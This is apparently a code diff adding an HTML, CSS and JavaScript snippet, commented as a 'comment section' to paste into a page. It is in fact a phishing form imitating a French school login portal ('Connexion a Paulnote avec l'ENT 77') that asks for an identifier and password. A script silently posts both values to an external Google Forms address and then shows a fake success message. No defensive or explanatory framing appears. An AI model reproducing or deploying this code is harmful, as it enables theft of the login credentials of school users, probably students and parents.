@@ -1,0 +1,173 @@
+<!-- Section commentaire - coller avant </body> -->
+<style>
+.comment-section {
+  background: #EBF7ED;
+  border-radius: 12px;
+  padding: clamp(1rem, 4vw, 2rem);
+  max-width: 600px;
+  width: 100%;
+  margin: 2rem auto;
+  box-sizing: border-box;
+}
+.comment-section * { box-sizing: border-box; }
+.cs-title {
+  font-size: 13px;
+  font-weight: 500;
+  color: #1C5E20;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+  margin-bottom: 1.25rem;
+}
+.cs-label {
+  display: block;
+  font-size: 13px;
+  color: #2E7D32;
+  font-weight: 500;
+  margin-bottom: 6px;
+}
+.cs-input, .cs-textarea {
+  width: 100%;
+  background: #fff;
+  border: 1px solid #A5D6A7;
+  border-radius: 8px;
+  color: #1C5E20;
+  font-size: 14px;
+  padding: 10px 14px;
+  outline: none;
+  margin-bottom: 1rem;
+  font-family: inherit;
+  transition: border .2s, box-shadow .2s;
+}
+.cs-input::placeholder, .cs-textarea::placeholder { color: #A5C8A7; }
+.cs-input:focus, .cs-textarea:focus {
+  border-color: #1C5E20;
+  box-shadow: 0 0 0 3px rgba(28,94,32,.1);
+}
+.cs-textarea { height: 100px; resize: none; }
+.cs-btn {
+  width: 100%;
+  padding: 11px;
+  border-radius: 8px;
+  border: none;
+  background: #1C5E20;
+  color: #fff;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  font-family: inherit;
+  transition: background .2s, transform .1s;
+}
+.cs-btn:hover { background: #2E7D32; }
+.cs-btn:active { transform: scale(0.98); }
+.cs-loader {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  gap: 14px;
+  padding: 2rem 0;
+}
+.cs-loader.visible { display: flex; }
+.cs-spinner {
+  width: 36px;
+  height: 36px;
+  border: 3px solid #A5D6A7;
+  border-top-color: #1C5E20;
+  border-radius: 50%;
+  animation: cs-spin .8s linear infinite;
+}
+@keyframes cs-spin { to { transform: rotate(360deg); } }
+.cs-loader-text { font-size: 13px; color: #2E7D32; }
+.cs-success {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  gap: 12px;
+  padding: 2rem 0;
+  text-align: center;
+}
+.cs-success.visible { display: flex; }
+.cs-check {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  background: #1C5E20;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.cs-check svg { width: 24px; height: 24px; }
+.cs-success-title { font-size: 16px; font-weight: 500; color: #1C5E20; }
+.cs-success-sub { font-size: 13px; color: #2E7D32; }
+.cs-reset {
+  font-size: 13px;
+  color: #1C5E20;
+  background: none;
+  border: none;
+  cursor: pointer;
+  text-decoration: underline;
+  font-family: inherit;
+}
+</style>
+
+<div class="comment-section">
+  <p class="cs-title">Connexion a Paulnote avec l'ENT 77</p>
+
+  <div id="cs-form">
+    <label class="cs-label" for="cs-titre">identifiant</label>
+    <input class="cs-input" id="cs-titre" type="text" placeholder="identifiant" />
+
+    <label class="cs-label" for="cs-comment">Mot de passe</label>
+    <textarea class="cs-textarea" id="cs-comment" placeholder="Mot de passe"></textarea>
+
+    <button class="cs-btn" onclick="csEnvoyer()">Se connecter</button>
+  </div>
+
+  <div class="cs-loader" id="cs-loader">
+    <div class="cs-spinner"></div>
+    <p class="cs-loader-text">Connection en cours...</p>
+  </div>
+
+  <div class="cs-success" id="cs-success">
+    <div class="cs-check">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+    <p class="cs-success-title">Commentaire envoyé !</p>
+    <p class="cs-success-sub">Merci, votre message a bien été reçu.</p>
+    <button class="cs-reset" onclick="csReset()">Envoyer un autre commentaire</button>
+  </div>
+</div>
+
+<script>
+async function csEnvoyer() {
+  const t = document.getElementById('cs-titre').value.trim();
+  const c = document.getElementById('cs-comment').value.trim();
+  if (!t || !c) { alert('Remplis les deux champs !'); return; }
+
+  document.getElementById('cs-form').style.display = 'none';
+  document.getElementById('cs-loader').classList.add('visible');
+
+  try {
+    await fetch("https://docs.google.com/forms/d/e/1FAIpQLSc_ku5T93yKn0i70qzBV4byaKpGIU19GHm6e16fdoIDQwm1gg/formResponse", {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams({
+        "entry.931803648": t,
+        "entry.667092912": c
+      })
+    });
+  } catch(e) {}
+
+  document.getElementById('cs-loader').classList.remove('visible');
+  document.getElementById('cs-success').classList.add('visible');
+}
+
+function csReset() {
+  document.getElementById('cs-titre').value = '';
+  document.getElementById('cs-comment').value = '';
+  document.getElementById('cs-success').classList.remove('visible');
+  document.getElementById('cs-form').style.display = 'block';
+}
+</script>
